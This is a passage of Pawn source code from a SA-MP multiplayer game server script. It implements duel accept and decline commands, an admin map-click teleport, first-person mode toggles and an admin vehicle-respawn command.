if(GetPlayerState(Invited[playerid]) == 9) return SendClientMessage(playerid,0xFF0000FF,"ERROR:{FFFFFF}The player who sent you duel invitation is currently in spec mode");
new tName[32],cName[32],string[128];
GetPlayerName(playerid,tName,sizeof(tName));
GetPlayerName(Invited[playerid],cName,sizeof(cName));
format(string,sizeof(string),"The duel between %s(%i) and %s(%i) has started",tName,playerid,cName,Invited[playerid]);
SendClientMessageToAll(0xFF9900FF,string);
DuelActive = true;
Dueling[Invited[playerid]] = true;
Duelist[Invited[playerid]] = playerid;
Dueling[playerid] = true;
Duelist[playerid] = Invited[playerid];
SetPlayerInterior(playerid,10);SetPlayerInterior(Invited[playerid],10);
SetPlayerPos(playerid,-973.190856,1060.630981,1345.674316);SetPlayerPos(Invited[playerid],-1132.407104,1057.550781,1346.410034);
SetPlayerFacingAngle(playerid,88.169311);SetPlayerFacingAngle(Invited[playerid],268.964355);
GivePlayerWeapon(playerid,8,1);
GivePlayerWeapon(Invited[playerid],8,1);
GivePlayerWeapon(playerid,24,200);
GivePlayerWeapon(Invited[playerid],24,200);
GivePlayerWeapon(playerid,27,500);
GivePlayerWeapon(Invited[playerid],27,500);
GivePlayerWeapon(playerid,31,300);
GivePlayerWeapon(Invited[playerid],31,300);
GivePlayerWeapon(playerid,34,100);
GivePlayerWeapon(Invited[playerid],34,100);
SetCameraBehindPlayer(playerid);SetCameraBehindPlayer(Invited[playerid]);
SetPlayerArmedWeapon(playerid,0);SetPlayerArmedWeapon(Invited[playerid],0);
Invited[playerid] = -1;
return 1;}
CMD:decline(playerid,params[]){
if(Invited[playerid] == -1) return SendClientMessage(playerid,0xFF0000FF,"ERROR:{FFFFFF}You haven't recieved duel invitation from anyone");
new cName[32],string[128];
GetPlayerName(playerid,cName,sizeof(cName));
format(string,sizeof(string),"%s(%i) has declined your duel invitation",cName,playerid);
SendClientMessage(Invited[playerid],0xFFFF00FF,string);
Invited[playerid]=-1;
return 1;}
//==============================================================================
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(PlayerInfo[playerid][OnDuty] >= 1)
	{
	    if(IsPlayerInAnyVehicle(playerid))
		{
		    new vehid =GetPlayerVehicleID(playerid);
		    SetVehiclePos(vehid, fX, fY, fZ);
		    SetPlayerPosFindZ(playerid, fX, fY, fZ);
		    PutPlayerInVehicle(playerid, vehid, 0);
		}
		else
		{
			SetPlayerPosFindZ(playerid, fX, fY, fZ);
		}
	}
 	return 1;
}
//==============================================================================
//==============================================================================
CMD:fps(playerid, params[])
{
	StartFPS(playerid);
	SendClientMessage(playerid, 0xFFFF00C8, "You Activated First Person Mode!");
	return 1;
}

CMD:nofps(playerid, params[])
{
	StopFPS(playerid);
	SendClientMessage(playerid, 0xFFFF00C8, "You De-Activated First Person Mode!");
	return 1;
}
//==============================================================================
CMD:rv(playerid,params[])
{
    if(PlayerInfo[playerid][LoggedIn] == 1)
    {
        if(PlayerInfo[playerid][Level] >= 4)
        {
            for(new car =1; car <= 268; car++)
                {
                    if(GetVehicleEmpty(car)) SetVehicleToRespawn(car);
                 }
                 new string[128];
                format(string,sizeof(string),"Administrator %s has respawn all unused vehicles.",pName(playerid));
                SendClientMessageToAll(blue,string);
        }else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
    }else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
    return 1;
}
CMD:respawnvehicle(playerid,params[]) {
     return cmd_rv(playerid, params);
}
stock GetVehicleEmpty(vehicleid)
{
    for(new  i=0; i<MAX_PLAYERS; i++)
        {
            if(IsPlayerInVehicle(i, vehicleid))
            return 0;
          }
          return 1;
}
//==============================================================================
//=========================Copyrights by xMx4LiFe,Jarnu and Rog=============================
////////////////////////////////////////////////////////////////////////////////
